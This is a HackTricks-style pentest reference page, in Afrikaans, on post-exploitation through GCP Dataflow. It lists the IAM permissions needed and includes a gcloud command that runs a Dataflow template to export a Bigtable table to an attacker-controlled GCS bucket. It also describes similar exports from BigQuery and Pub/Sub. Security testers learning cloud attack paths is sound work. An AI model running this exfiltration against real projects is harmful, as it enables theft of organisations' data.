# GCP - Dataflow Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

Vir meer inligting oor Dataflow sien:

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### Gebruik Dataflow om data van ander dienste te exfiltrateer

**Permissies:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs` (over a SA with access to source and sink)

Met Dataflow job-skeppingsregte kan jy GCP Dataflow-templates gebruik om data uit Bigtable, BigQuery, Pub/Sub en ander dienste na GCS-buckets wat deur die aanvaller beheer word uit te voer. Dit is 'n kragtige post-exploitation technique wanneer jy Dataflow-toegang bekom het — byvoorbeeld via die [Dataflow Rider](../gcp-privilege-escalation/gcp-dataflow-privesc.md) privilege escalation (pipeline takeover via bucket write).

> [!NOTE]
> Jy het `iam.serviceAccounts.actAs` oor 'n service account met voldoende permissies nodig om die source te lees en na die sink te skryf. By default word die Compute Engine default SA gebruik as dit nie gespesifiseer is nie.

#### Bigtable na GCS

Sien [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md#dump-rows-to-your-bucket) — "Dump rows to your bucket" vir die volledige patroon. Templates: `Cloud_Bigtable_to_GCS_Json`, `Cloud_Bigtable_to_GCS_Parquet`, `Cloud_Bigtable_to_GCS_SequenceFile`.

<details>

<summary>Voer Bigtable na 'n deur die aanvaller beheerde bucket uit</summary>
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<YOUR_BUCKET>/raw-json/ \
--staging-location=gs://<YOUR_BUCKET>/staging/
```
</details>

#### BigQuery to GCS

Dataflow templates bestaan om BigQuery-data uit te voer. Gebruik die toepaslike template vir jou teikenvormaat (JSON, Avro, etc.) en wys die uitset na jou bucket.

#### Pub/Sub and streaming sources

Stroompyplyne kan van Pub/Sub (of ander bronne) lees en na GCS skryf. Begin 'n job' met 'n template wat van die teiken Pub/Sub subscription lees en na jou beheerde bucket skryf.

## References

- [Dataflow templates](https://cloud.google.com/dataflow/docs/guides/templates/provided-templates)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md)

{{#include ../../../banners/hacktricks-training.md}}
